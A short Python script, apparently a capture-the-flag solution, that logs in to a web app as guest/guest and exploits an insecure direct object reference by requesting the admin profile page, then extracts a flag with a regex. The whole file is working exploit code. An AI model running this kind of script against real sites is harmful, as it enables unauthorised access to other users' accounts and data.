# Made by MuteAvery
# Imports
import requests
import sys
from bs4 import BeautifulSoup
import re

# login
def login(s, url):
    login_url = url + '/index.php'
    login_data = {
        'username': 'guest',
        'password': 'guest'
    }
    r = s.post(login_url, login_data)
    if r.status_code == 200:
        print("\n(+) Successfully logged in as User Guest\n")
    else:
        print(f"\n(!) Failed to login as user Guest: REASON: {r.status_code}\n")
        sys.exit(-1)

# exploit
def exploit(s, url):
    idor_url = url + '/profile.php?user=admin'
    r = s.get(idor_url)
    if 'flag' in r.text:
        print("\n(+) Exploit successful, you are now admin\n")
        pattern = re.compile(r'flag\{.*?\}')
        soup = BeautifulSoup(r.text, 'html.parser')
        flag = pattern.search(soup.get_text())
        if flag:
            print(f"\n(+) Here is your flag: {flag.group(0)}\n")
        else:
            print("\n(!) Flag not found\n")
    else:
        print("\n(!) Exploit failed\n")

# main
def main():
    if len(sys.argv) != 2:
        print(f"\n(!) Usage: {sys.argv[0]} <url>\n")
        print(f"\n(!) Example: {sys.argv[0]} www.example.com\n")
        sys.exit(-1)
    
    s = requests.session()
    url = sys.argv[1]

    # Call the login function
    login(s, url)
    exploit(s, url)

if __name__ == '__main__':
    main()
